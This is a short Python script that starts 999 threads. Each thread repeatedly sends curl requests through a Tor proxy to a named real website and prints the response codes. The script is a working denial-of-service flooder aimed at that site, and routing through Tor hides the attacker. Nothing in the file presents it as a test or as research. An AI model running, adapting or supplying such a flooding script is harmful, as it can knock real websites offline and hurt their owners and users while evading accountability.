import subprocess
import threading

url = "https://camp-kosice.sk"

tor_proxy = "socks5h://127.0.0.1:9050"  # Tor's default SOCKS5 proxy address

# Use the curl command with the --proxy and -w options to route through Tor and format the output
command = f"curl --proxy {tor_proxy} -w '%{{http_code}}' -o /dev/null {url}"


def start():
    while True:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
        output, error = process.communicate()

        # To print the HTTP response code
        response_code = output.decode().strip()
        print(f"HTTP Response Code: {response_code}")



for x in range(1,1000):
    t = threading.Thread(target=start)
    t.start()
